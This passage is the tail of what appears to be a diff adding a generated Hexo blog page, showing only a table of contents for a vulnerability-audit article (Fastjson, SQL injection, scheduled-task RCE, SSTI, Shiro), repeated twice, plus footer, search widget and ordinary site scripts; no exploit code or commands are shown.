class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-4"><span class="nav-number">6.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D-4"><span class="nav-number">6.3.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#-5"><span class="nav-number">7.</span> <span class="nav-text">&lt;&#x3D;4.8.1-定时任务绕过&amp;文件上传&amp;JNI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-4"><span class="nav-number">7.1.</span> <span class="nav-text">漏洞发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-5"><span class="nav-number">7.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D-5"><span class="nav-number">7.3.</span> <span class="nav-text">修复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83-1"><span class="nav-number">7.4.</span> <span class="nav-text">参考</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#-6"><span class="nav-number">8.</span> <span class="nav-text">&lt;&#x3D;4.7.1-SSTI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-5"><span class="nav-number">8.1.</span> <span class="nav-text">漏洞发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-6"><span class="nav-number">8.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="nav-number">8.3.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shiro%E7%9B%B8%E5%85%B3"><span class="nav-number">9.</span> <span class="nav-text">shiro相关</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">10.</span> <span class="nav-text">总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">10.1.</span> <span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="nav-number">10.2.</span> <span class="nav-text">定时任务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="nav-number">10.3.</span> <span class="nav-text">任意文件下载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%A1%E8%AE%A1%E5%8E%9F%E5%88%99"><span class="nav-number">10.4.</span> <span class="nav-text">审计原则</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;2025
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">1diot9</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
+            
+        </div>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">41.9k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">&lt;&#x3D;4.2.0-Fastjson</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D"><span class="nav-number">1.3.</span> <span class="nav-text">修复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">1.4.</span> <span class="nav-text">小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">1.5.</span> <span class="nav-text">参考</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#-1"><span class="nav-number">2.</span> <span class="nav-text">&lt;&#x3D;4.5.0-任意文件下载</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D-1"><span class="nav-number">2.1.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#-2"><span class="nav-number">3.</span> <span class="nav-text">&lt;&#x3D;4.7.8-定时任务&amp;任意文件下载</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-1"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D-2"><span class="nav-number">3.3.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#-3"><span class="nav-number">4.</span> <span class="nav-text">&lt;&#x3D;4.6.1-SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-2"><span class="nav-number">4.1.</span> <span class="nav-text">漏洞发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-2"><span class="nav-number">4.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">4.3.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-7-1-4-7-8-SQL%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87"><span class="nav-number">5.</span> <span class="nav-text">4.7.1-4.7.8-SQL注入+绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-3"><span class="nav-number">5.1.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D-3"><span class="nav-number">5.2.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#-4"><span class="nav-number">6.</span> <span class="nav-text">&lt;&#x3D;4.7.8-定时任务SQL&amp;RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-3"><span class="nav-number">6.1.</span> <span class="nav-text">漏洞发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-4"><span class="nav-number">6.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D-4"><span class="nav-number">6.3.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#-5"><span class="nav-number">7.</span> <span class="nav-text">&lt;&#x3D;4.8.1-定时任务绕过&amp;文件上传&amp;JNI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-4"><span class="nav-number">7.1.</span> <span class="nav-text">漏洞发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-5"><span class="nav-number">7.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D-5"><span class="nav-number">7.3.</span> <span class="nav-text">修复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83-1"><span class="nav-number">7.4.</span> <span class="nav-text">参考</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#-6"><span class="nav-number">8.</span> <span class="nav-text">&lt;&#x3D;4.7.1-SSTI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-5"><span class="nav-number">8.1.</span> <span class="nav-text">漏洞发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-6"><span class="nav-number">8.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="nav-number">8.3.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shiro%E7%9B%B8%E5%85%B3"><span class="nav-number">9.</span> <span class="nav-text">shiro相关</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">10.</span> <span class="nav-text">总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">10.1.</span> <span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="nav-number">10.2.</span> <span class="nav-text">定时任务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="nav-number">10.3.</span> <span class="nav-text">任意文件下载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%A1%E8%AE%A1%E5%8E%9F%E5%88%99"><span class="nav-number">10.4.</span> <span class="nav-text">审计原则</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
